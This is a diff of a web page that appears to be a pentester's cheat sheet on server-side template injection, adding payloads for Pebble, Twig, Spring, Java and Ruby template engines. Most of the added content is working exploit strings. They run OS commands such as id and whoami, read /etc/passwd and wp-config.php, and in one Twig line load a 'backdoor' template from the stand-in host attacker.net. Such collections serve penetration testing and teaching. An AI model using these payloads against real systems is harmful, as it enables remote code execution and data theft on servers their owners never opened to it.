+</span></span><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">.</span>getClass()<span style="color:#f92672">.</span>forName(<span style="color:#e6db74">&#39;javax.script.ScriptEngineManager&#39;</span>)<span style="color:#f92672">.</span>newInstance()<span style="color:#f92672">.</span>getEngineByName(<span style="color:#e6db74">&#39;JavaScript&#39;</span>)<span style="color:#f92672">.</span>eval(\<span style="color:#e6db74">&#34;var x=new java.lang.ProcessBuilder; x.command(</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">whoami</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">); x.start()</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)}}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">.</span>getClass()<span style="color:#f92672">.</span>forName(<span style="color:#e6db74">&#39;javax.script.ScriptEngineManager&#39;</span>)<span style="color:#f92672">.</span>newInstance()<span style="color:#f92672">.</span>getEngineByName(<span style="color:#e6db74">&#39;JavaScript&#39;</span>)<span style="color:#f92672">.</span>eval(\<span style="color:#e6db74">&#34;var x=new java.lang.ProcessBuilder; x.command(</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">netstat</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)}}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">.</span>getClass()<span style="color:#f92672">.</span>forName(<span style="color:#e6db74">&#39;javax.script.ScriptEngineManager&#39;</span>)<span style="color:#f92672">.</span>newInstance()<span style="color:#f92672">.</span>getEngineByName(<span style="color:#e6db74">&#39;JavaScript&#39;</span>)<span style="color:#f92672">.</span>eval(\<span style="color:#e6db74">&#34;var x=new java.lang.ProcessBuilder; x.command(</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">uname</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">-a</span><span style="color:#ae81ff">\\\&#34;</span><span style="color:#e6db74">); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)}}</span>
+</span></span></code></pre></div><hr>
 <h2 id="lessjs">
   Lessjs
   <a class="anchor" href="#lessjs">#</a>
@@ -2060,11 +2413,30 @@ https://github.com/alex-shpak/hugo-book
 <blockquote>
 <p>Pebble is a Java templating engine inspired by <a href="./#twig">Twig</a> and similar to the Python <a href="./#jinja2">Jinja</a> Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.</p>
 </blockquote>
-<h3 id="need-bugfix-for-pebble">
-  NEED BUGFIX FOR PEBBLE
-  <a class="anchor" href="#need-bugfix-for-pebble">#</a>
+<h3 id="pebble---basic-injection">
+  Pebble - Basic injection
+  <a class="anchor" href="#pebble---basic-injection">#</a>
 </h3>
-<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">{{</span> someString<span style="color:#f92672">.</span><span style="color:#a6e22e">toUPPERCASE</span><span style="color:#f92672">()</span> <span style="color:#f92672">}}</span>
+</span></span></code></pre></div><h3 id="pebble---code-execution">
+  Pebble - Code execution
+  <a class="anchor" href="#pebble---code-execution">#</a>
+</h3>
+<p>Old version of Pebble ( &lt; version 3.0.9): <code>{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}</code>.</p>
+<p>New version of Pebble :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">{%</span> set cmd <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>id<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">%}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{%</span> set bytes <span style="color:#f92672">=</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">).</span><span style="color:#a6e22e">TYPE</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">methods</span><span style="color:#f92672">[</span><span style="color:#ae81ff">6</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span><span style="color:#66d9ef">null</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>cmd<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">inputStream</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">readAllBytes</span><span style="color:#f92672">()</span> <span style="color:#f92672">%}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{{</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">).</span><span style="color:#a6e22e">TYPE</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">String</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">constructors</span><span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(([</span>bytes<span style="color:#f92672">]).</span><span style="color:#a6e22e">toArray</span><span style="color:#f92672">())</span> <span style="color:#f92672">}}</span>
+</span></span></code></pre></div><hr>
 <h2 id="ruby">
   Ruby
   <a class="anchor" href="#ruby">#</a>
@@ -2075,8 +2447,6 @@ https://github.com/alex-shpak/hugo-book
 </h3>
 <p>ERB:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">&lt;%=</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">%&gt;</span>
-</span></span></code></pre></div><p>Slim:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e">#{ 7 * 7 }</span>
 </span></span></code></pre></div><h3 id="ruby---retrieve-etcpasswd">
   Ruby - Retrieve /etc/passwd
   <a class="anchor" href="#ruby---retrieve-etcpasswd">#</a>
@@ -2098,7 +2468,7 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">% require </span> <span style="color:#e6db74">&#39;open3&#39;</span> <span style="color:#e6db74">%&gt;&lt;% @a,@b,@c,@d=Open3.popen3(&#39;whoami&#39;) %&gt;</span><span style="color:#f92672">&lt;</span><span style="color:#e6db74">%= @b.readline()%&gt;
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;% require &#39;open4&#39; %&gt;&lt;% @a,@b,@c,@d=</span><span style="color:#66d9ef">Open4</span><span style="color:#f92672">.</span>popen4(<span style="color:#e6db74">&#39;whoami&#39;</span>) <span style="color:#e6db74">%&gt;&lt;%= @c.readline()%&gt;</span>
 </span></span></code></pre></div><p>Execute code using SSTI for Slim engine.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e">#{ %x|env| }</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e">#{ %x|env| }</span>
 </span></span></code></pre></div><hr>
 <h2 id="smarty">
   Smarty
@@ -2126,11 +2496,12 @@ https://github.com/alex-shpak/hugo-book
   Twig - Basic injection
   <a class="anchor" href="#twig---basic-injection">#</a>
 </h3>
-<h3 id="need-bugfix-for-twig">
-  NEED BUGFIX FOR TWIG
-  <a class="anchor" href="#need-bugfix-for-twig">#</a>
-</h3>
-<h3 id="twig---template-format">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>}}
+</span></span><span style="display:flex;"><span>{{<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#39;7&#39;</span>}} would result <span style="color:#f92672">in</span> <span style="color:#ae81ff">49</span>
+</span></span><span style="display:flex;"><span>{{dump(app)}}
+</span></span><span style="display:flex;"><span>{{dump(_context)}}
+</span></span><span style="display:flex;"><span>{{app<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>server<span style="color:#f92672">.</span>all<span style="color:#f92672">|</span>join(<span style="color:#e6db74">&#39;,&#39;</span>)}}
+</span></span></code></pre></div><h3 id="twig---template-format">
   Twig - Template format
   <a class="anchor" href="#twig---template-format">#</a>
 </h3>
@@ -2143,23 +2514,48 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;Dear </span><span style="color:#e6db74">{first_name}</span><span style="color:#e6db74">&#34;</span>,
 </span></span><span style="display:flex;"><span>  array(<span style="color:#e6db74">&#34;first_name&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#960050;background-color:#1e0010">$</span>user<span style="color:#f92672">.</span>first_name)
 </span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><h3 id="twig---arbitrary-file-reading">
+  Twig - Arbitrary File Reading
+  <a class="anchor" href="#twig---arbitrary-file-reading">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#34;{{&#39;/etc/passwd&#39;|file_excerpt(1,30)}}&#34;</span><span style="color:#f92672">@</span>
+</span></span><span style="display:flex;"><span>{{include(<span style="color:#e6db74">&#34;wp-config.php&#34;</span>)}}
+</span></span></code></pre></div><h3 id="twig---code-execution">
+  Twig - Code execution
+  <a class="anchor" href="#twig---code-execution">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{self}}
+</span></span><span style="display:flex;"><span>{{_self<span style="color:#f92672">.</span>env<span style="color:#f92672">.</span>setCache(<span style="color:#e6db74">&#34;ftp://attacker.net:2121&#34;</span>)}}{{_self<span style="color:#f92672">.</span>env<span style="color:#f92672">.</span>loadTemplate(<span style="color:#e6db74">&#34;backdoor&#34;</span>)}}
+</span></span><span style="display:flex;"><span>{{_self<span style="color:#f92672">.</span>env<span style="color:#f92672">.</span>registerUndefinedFilterCallback(<span style="color:#e6db74">&#34;exec&#34;</span>)}}{{_self<span style="color:#f92672">.</span>env<span style="color:#f92672">.</span>getFilter(<span style="color:#e6db74">&#34;id&#34;</span>)}}
+</span></span><span style="display:flex;"><span>{{[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">|</span>filter(<span style="color:#e6db74">&#39;system&#39;</span>)}}
+</span></span><span style="display:flex;"><span>{{[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">|</span>reduce(<span style="color:#e6db74">&#39;system&#39;</span>,<span style="color:#e6db74">&#39;id&#39;</span>)}}
+</span></span><span style="display:flex;"><span>{{[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">|</span>map(<span style="color:#e6db74">&#39;system&#39;</span>)<span style="color:#f92672">|</span>join}}
+</span></span><span style="display:flex;"><span>{{[<span style="color:#e6db74">&#39;id&#39;</span>,<span style="color:#ae81ff">1</span>]<span style="color:#f92672">|</span>sort(<span style="color:#e6db74">&#39;system&#39;</span>)<span style="color:#f92672">|</span>join}}
+</span></span><span style="display:flex;"><span>{{[<span style="color:#e6db74">&#39;cat</span><span style="color:#ae81ff">\x20</span><span style="color:#e6db74">/etc/passwd&#39;</span>]<span style="color:#f92672">|</span>filter(<span style="color:#e6db74">&#39;system&#39;</span>)}}
+</span></span><span style="display:flex;"><span>{{[<span style="color:#e6db74">&#39;cat$IFS/etc/passwd&#39;</span>]<span style="color:#f92672">|</span>filter(<span style="color:#e6db74">&#39;system&#39;</span>)}}
+</span></span><span style="display:flex;"><span>{{[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">|</span>filter(<span style="color:#e6db74">&#39;passthru&#39;</span>)}}
+</span></span><span style="display:flex;"><span>{{[<span style="color:#e6db74">&#39;id&#39;</span>]<span style="color:#f92672">|</span>map(<span style="color:#e6db74">&#39;passthru&#39;</span>)}}
+</span></span></code></pre></div><p>Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>FILENAME{<span style="color:#f92672">%</span> set var <span style="color:#f92672">=</span> dump(_context)[OFFSET:LENGTH] <span style="color:#f92672">%</span>} {{ include(var) }}
+</span></span></code></pre></div><p>Example with an email passing FILTER_VALIDATE_EMAIL PHP.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>POST /subscribe<span style="color:#66d9ef">?</span><span style="color:#ae81ff">0</span>=cat+/etc/passwd HTTP/<span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>email=<span style="color:#e6db74">&#34;{{app.request.query.filter(0,0,1024,{&#39;options&#39;:&#39;system&#39;})}}&#34;</span>@attacker.tld
 </span></span></code></pre></div><hr>
-<h2 id="velocity">
-  Velocity
-  <a class="anchor" href="#velocity">#</a>
+<h2 id="java---velocity">
+  Java - Velocity
+  <a class="anchor" href="#java---velocity">#</a>
 </h2>
 <p><a href="https://velocity.apache.org/engine/1.7/user-guide.html">Official website</a></p>
 <blockquote>
 <p>Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#set($str=$class.inspect(&#34;java.lang.String&#34;).type)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#set($chr=$class.inspect(&#34;java.lang.Character&#34;).type)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#set($ex=$class.inspect(&#34;java.lang.Runtime&#34;).type.getRuntime().exec(&#34;whoami&#34;))</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>ex<span style="color:#f92672">.</span>waitFor()
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#set($out=$ex.getInputStream())</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#foreach($i in [1..$out.available()])</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>str<span style="color:#f92672">.</span>valueOf(<span style="color:#960050;background-color:#1e0010">$</span>chr<span style="color:#f92672">.</span>toChars(<span style="color:#960050;background-color:#1e0010">$</span>out<span style="color:#f92672">.</span>read()))
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#end</span>
+<hr>
+<h2 id="java---spring">
+  Java - Spring
+  <a class="anchor" href="#java---spring">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">*</span>{<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>}
+</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>{T(org<span style="color:#f92672">.</span>apache<span style="color:#f92672">.</span>commons<span style="color:#f92672">.</span>io<span style="color:#f92672">.</span>IOUtils)<span style="color:#f92672">.</span>toString(T(java<span style="color:#f92672">.</span>lang<span style="color:#f92672">.</span>Runtime)<span style="color:#f92672">.</span>getRuntime()<span style="color:#f92672">.</span>exec(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>getInputStream())}
 </span></span></code></pre></div><hr>
 <h2 id="pattemplate">
   patTemplate
@@ -2266,13 +2662,11 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 <ul>
 <li><a href="https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/">https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/</a></li>
-<li><a href="https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/">Yahoo! RCE via Spring Engine SSTI</a></li>
 <li><a href="https://www.trustedsec.com/2017/09/rubyerb-template-injection/">Ruby ERB Template injection - TrustedSec</a></li>
 <li><a href="https://gist.github.com/Yas3r/7006ec36ffb987cbfb98">Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger)</a></li>
 <li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf">PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax</a></li>
-<li><a href="https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/">VelocityServlet Expression Language injection</a></li>
+<li><a href="https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/">VelocityServlet Expression Language injection</a></li>
 <li><a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti">Cheatsheet - Flask &amp; Jinja2 SSTI - Sep 3, 2018 • By phosphore</a></li>
-<li><a href="https://medium.com/@ajdumanhug/ritsec-ctf-2018-writeup-web-72a0e5aa01ad">RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug</a></li>
 <li><a href="https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw">RCE in Hubspot with EL injection in HubL - @fyoorer</a></li>
 <li><a href="https://0day.work/jinja2-template-injection-filter-bypasses/">Jinja2 template injection filter bypasses - @gehaxelt, @0daywork</a></li>
 <li><a href="https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9">Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018</a></li>
@@ -2287,6 +2681,10 @@ https://github.com/alex-shpak/hugo-book
 <li><a href="https://www.softwaresecured.com/exploiting-less-js/">Exploiting Less.js to Achieve RCE</a></li>
 <li><a href="https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti">A Pentester&rsquo;s Guide to Server Side Template Injection (SSTI)</a></li>
 <li><a href="https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf">Django Templates Server-Side Template Injection</a></li>
+<li><a href="https://youtu.be/M0b_KA0OMFw">#HITB2022SIN #LAB Template Injection On Hardened Targets - Lucas &lsquo;BitK&rsquo; Philippe</a></li>
+<li><a href="https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/">Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Dec 4, 2022</a></li>
+<li><a href="https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/">Leveraging the Spring Expression Language (SpEL) injection vulnerability ( a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021</a></li>
+<li><a href="https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection">Expression Language Injection - OWASP</a></li>
 </ul>
 </article>
  
@@ -2297,9 +2695,9 @@ https://github.com/alex-shpak/hugo-book
   <div class="flex flex-wrap justify-between">
 
 
-  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/75f0a66614fa426f8abba2c6d831f05bf85bfab5" title='Last modified by Stuart Gray | January 27, 2023' target="_blank" rel="noopener">
+  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/421b6a3226d33ea7c107a6ce319940d1100230b6" title='Last modified by Stuart Gray | June 22, 2023' target="_blank" rel="noopener">
       <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>January 27, 2023</span>
+      <span>June 22, 2023</span>
     </a>
   </div>
 
@@ -2331,16 +2729,11 @@ https://github.com/alex-shpak/hugo-book
   
 <nav id="TableOfContents">
   <ul>
-    <li><a href="#server-side-template-injections">Server-Side Template Injections</a>
+    <li><a href="#server-side-template-injection">Server Side Template Injection</a>
       <ul>
-        <li><a href="#note-that-hugo-still-has-some-difficulty-handling-certain-strings-in-certain-manners-here-and-its-under-investigation-but-for-now-this-section-is-incomplete-and-gray-hat-freelancing-is-aware">Note that Hugo still has some difficulty handling certain strings in certain manners here and it&rsquo;s under investigation, but.. for now.. this section is incomplete and Gray Hat Freelancing is aware</a></li>
+        <li><a href="#summary">Summary</a></li>
         <li><a href="#tools">Tools</a></li>
         <li><a href="#methodology">Methodology</a></li>
-        <li><a href="#detection">Detection</a>
-          <ul>
-            <li><a href="#need-bugfix-for-this-polyglot">NEED BUGFIX FOR THIS POLYGLOT</a></li>
-          </ul>
-        </li>
         <li><a href="#aspnet-razor">ASP.NET Razor</a>
           <ul>
             <li><a href="#aspnet-razor---basic-injection">ASP.NET Razor - Basic injection</a></li>
@@ -2349,7 +2742,7 @@ https://github.com/alex-shpak/hugo-book
         </li>
         <li><a href="#expression-language-el">Expression Language EL</a>
           <ul>
-            <li><a href="#expression-language-el---basic-injection">Expression Language EL - Basic injection</a></li>
+            <li><a href="#expression-language-el---properties">Expression Language EL - Properties</a></li>
             <li><a href="#expression-language-el---one-liner-injections-not-including-code-execution">Expression Language EL - One-Liner injections not including code execution</a></li>
             <li><a href="#expression-language-el---code-execution">Expression Language EL - Code Execution</a></li>
           </ul>
@@ -2373,31 +2766,44 @@ https://github.com/alex-shpak/hugo-book
         </li>
         <li><a href="#handlebars">Handlebars</a>
           <ul>
-            <li><a href="#need-bugfix-for-handlebars">NEED BUGFIX FOR HANDLEBARS</a></li>
+            <li><a href="#handlebars---command-execution">Handlebars - Command Execution</a></li>
           </ul>
         </li>
         <li><a href="#jade--codepen">Jade / Codepen</a></li>
         <li><a href="#java">Java</a>
           <ul>
             <li><a href="#java---basic-injection">Java - Basic injection</a></li>
-            <li><a href="#need-bugfix-for-some-java">NEED BUGFIX FOR SOME JAVA</a></li>
             <li><a href="#java---retrieve-the-systems-environment-variables">Java - Retrieve the system’s environment variables</a></li>
             <li><a href="#java---retrieve-etcpasswd">Java - Retrieve /etc/passwd</a></li>
           </ul>
         </li>
         <li><a href="#django-templates">Django Templates</a>
           <ul>
-            <li><a href="#need-bugfix-for-django">NEED BUGFIX FOR DJANGO</a></li>
+            <li><a href="#detection">Detection</a></li>
+            <li><a href="#django-templates-for-post-exploitation">Django Templates for post-exploitation</a></li>
+            <li><a href="#cross-site-scripting">Cross-site scripting</a></li>
+            <li><a href="#debug-information-leak">Debug information leak</a></li>
+            <li><a href="#leaking-apps-secret-key">Leaking app’s Secret Key</a></li>
+            <li><a href="#admin-site-url-leak">Admin Site URL leak</a></li>
+            <li><a href="#admin-username-and-password-hash-leak">Admin username and password hash leak</a></li>
           </ul>
         </li>
         <li><a href="#jinja2">Jinja2</a>
           <ul>
-            <li><a href="#need-bugfix-for-jinja2">NEED BUGFIX FOR JINJA2</a></li>
+            <li><a href="#jinja2---basic-injection">Jinja2 - Basic injection</a></li>
+            <li><a href="#jinja2---template-format">Jinja2 - Template format</a></li>
+            <li><a href="#jinja2---debug-statement">Jinja2 - Debug Statement</a></li>
+            <li><a href="#jinja2---dump-all-used-classes">Jinja2 - Dump all used classes</a></li>
+            <li><a href="#jinja2---dump-all-config-variables">Jinja2 - Dump all config variables</a></li>
+            <li><a href="#jinja2---write-into-remote-file">Jinja2 - Write into remote file</a></li>
+            <li><a href="#jinja2---remote-code-execution">Jinja2 - Remote Code Execution</a></li>
+            <li><a href="#jinja2---filter-bypass">Jinja2 - Filter bypass</a></li>
           </ul>
         </li>
         <li><a href="#jinjava">Jinjava</a>
           <ul>
-            <li><a href="#need-bugfix-for-jinjava">NEED BUGFIX FOR JINJAVA</a></li>
+            <li><a href="#jinjava---basic-injection">Jinjava - Basic injection</a></li>
+            <li><a href="#jinjava---command-execution">Jinjava - Command execution</a></li>
           </ul>
         </li>
         <li><a href="#lessjs">Lessjs</a>
@@ -2414,7 +2820,8 @@ https://github.com/alex-shpak/hugo-book
         </li>
         <li><a href="#pebble">Pebble</a>
           <ul>
-            <li><a href="#need-bugfix-for-pebble">NEED BUGFIX FOR PEBBLE</a></li>
+            <li><a href="#pebble---basic-injection">Pebble - Basic injection</a></li>
+            <li><a href="#pebble---code-execution">Pebble - Code execution</a></li>
           </ul>
         </li>
         <li><a href="#ruby">Ruby</a>
@@ -2429,11 +2836,13 @@ https://github.com/alex-shpak/hugo-book
         <li><a href="#twig">Twig</a>
           <ul>
             <li><a href="#twig---basic-injection">Twig - Basic injection</a></li>
-            <li><a href="#need-bugfix-for-twig">NEED BUGFIX FOR TWIG</a></li>
             <li><a href="#twig---template-format">Twig - Template format</a></li>
+            <li><a href="#twig---arbitrary-file-reading">Twig - Arbitrary File Reading</a></li>
+            <li><a href="#twig---code-execution">Twig - Code execution</a></li>
           </ul>
         </li>
-        <li><a href="#velocity">Velocity</a></li>
+        <li><a href="#java---velocity">Java - Velocity</a></li>
+        <li><a href="#java---spring">Java - Spring</a></li>
         <li><a href="#pattemplate">patTemplate</a></li>
         <li><a href="#phplib-and-html_template_phplib">PHPlib and HTML_Template_PHPLIB</a></li>
         <li><a href="#plates">Plates</a></li>
